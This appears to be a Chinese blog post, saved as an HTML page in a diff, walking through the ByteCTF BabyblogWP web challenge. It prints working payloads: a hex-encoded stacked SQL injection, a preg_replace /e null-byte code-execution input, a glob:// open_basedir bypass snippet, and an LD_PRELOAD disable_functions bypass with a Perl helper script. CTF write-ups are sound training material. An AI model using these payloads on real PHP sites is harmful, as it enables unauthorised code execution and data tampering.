@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="Bytectf-BabyblogWP"/>
+
+
+
+
+  <meta name="keywords" content="技术辣鸡的PHP," />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="RuoWeber">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2020/01/29/Bytectf-BabyblogWP/"/>
+
+
+<meta name="description" content="BabyblogWP二次注入第一个点为二次注入，题目可以拿到源码，然后在edit.php发现注入点  这里发现where title处直接拼接了row[‘title’](这个是从数据库取出的数据)，造成了二次注入。">
+<meta name="keywords" content="技术辣鸡的PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bytectf-BabyblogWP">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;29&#x2F;Bytectf-BabyblogWP&#x2F;index.html">
+<meta property="og:site_name" content="RuoWeber">
+<meta property="og:description" content="BabyblogWP二次注入第一个点为二次注入，题目可以拿到源码，然后在edit.php发现注入点  这里发现where title处直接拼接了row[‘title’](这个是从数据库取出的数据)，造成了二次注入。">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;73358092-d577f880-42d8-11ea-9105-36b5a9e5d3d1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;73358514-b9c12200-42d9-11ea-9de1-b15100ee0536.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;73359480-e4ac7580-42db-11ea-8387-336a021c8bdb.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;73359648-4d93ed80-42dc-11ea-9129-54cbc1e0fec7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;73359775-8d5ad500-42dc-11ea-9f35-5ccd9be581a8.png">
+<meta property="og:updated_time" content="2020-01-29T13:22:27.514Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;user-images.githubusercontent.com&#x2F;34148939&#x2F;73358092-d577f880-42d8-11ea-9105-36b5a9e5d3d1.png">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+
+
+
+    <title> Bytectf-BabyblogWP - RuoWeber </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">RuoWeber</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Bytectf-BabyblogWP
+        
+      </h1>
+
+      <time class="post-time">
+          Jan 29 2020
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <h3 id="BabyblogWP"><a href="#BabyblogWP" class="headerlink" title="BabyblogWP"></a>BabyblogWP</h3><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>第一个点为二次注入，题目可以拿到源码，然后在edit.php发现注入点</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/73358092-d577f880-42d8-11ea-9105-36b5a9e5d3d1.png" alt=""></p>
+<p>这里发现where title处直接拼接了row[‘title’](这个是从数据库取出的数据)，造成了二次注入。</p>
+<a id="more"></a>
+
+<p>由于有safefilter的过滤，所以这里采用十六进制堆叠注入使当前用户变成vip:</p>
+<p><code>&quot;update users set isvip=1 where username=&#39;xxx&#39;;&quot;.encode(&#39;hex&#39;)</code></p>
+<p><code>&#39;;set @t=0x************;prepare x from @t;execute x;&#39;</code></p>
+<h4 id="正则匹配-e参数的任意命令执行"><a href="#正则匹配-e参数的任意命令执行" class="headerlink" title="正则匹配/e参数的任意命令执行"></a>正则匹配/e参数的任意命令执行</h4><p><img src="https://user-images.githubusercontent.com/34148939/73358514-b9c12200-42d9-11ea-9de1-b15100ee0536.png" alt=""></p>
+<p>看到preg_replace的pattern参数可控，在php版本较低时可以任意命令执行，payload为:</p>
+<p><code>find=/e%00(截断后面那个/)&amp;replace=phpinfo();</code>,从而写进一个shell进行进一步利用</p>
+<h4 id="绕过openbasedir"><a href="#绕过openbasedir" class="headerlink" title="绕过openbasedir"></a>绕过openbasedir</h4><p>其实这个点我没怎么做，看到openbasedir和disable_function，第一反应是想办法执行根目录下的/readflag，这里学到一个绕过openbasedir的另一个操作：</p>
+<p>glob://协议和其他函数的结合使用</p>
+<p>exp如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  	<span class="keyword">if</span>($b = opendir(<span class="string">'glob:///*'</span>))&#123;</span><br><span class="line">      <span class="keyword">while</span>(($file=readdir($b))!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $file.<span class="string">"   "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    closedir($b);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="绕过disable-funtion"><a href="#绕过disable-funtion" class="headerlink" title="绕过disable_funtion"></a>绕过disable_funtion</h4><p>这里选择了使用LD_PRELOAD劫持函数实现任意命令执行，这里直接执行了/readflag&gt;/var/www/html/a.txt</p>
+<p>但是发现这是个有SIGALRM信号的计算题，本来这个题很好算，只要<code>trap &quot;&quot; 14</code>忽略信号处理慢慢算即可，但这的前提是你有个比较完整的shell，但是buu这里又反弹不了shell，我们手里的shell又无法直接绕过disable_function执行系统命令，所以这里参考*ctf的管道解法，偷到一个perl脚本(稍微改下)</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>这里利用LD_PRELOAD劫持函数直接运行这个perl脚本(一般linux服务器都有perl)，</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/73359480-e4ac7580-42db-11ea-8387-336a021c8bdb.png" alt=""></p>
+<p>执行putenv，利用error_log(‘’,1,’’,’’)起新进程来执行我们的命令:</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/73359648-4d93ed80-42dc-11ea-9129-54cbc1e0fec7.png" alt=""></p>
+<p>得到flag:</p>
+<p><img src="https://user-images.githubusercontent.com/34148939/73359775-8d5ad500-42dc-11ea-9f35-5ccd9be581a8.png" alt=""></p>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/">技术辣鸡的PHP</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2020/02/14/Hgame2020Week4Web(Php&Js)/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">Hgame2020-Week4-部分WebWP</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2019/12/02/2018_web_virink_web/">
+        <span class="next-text nav-default">2018_web_virink_web</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2020
+    <span class="footer-author">asy.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
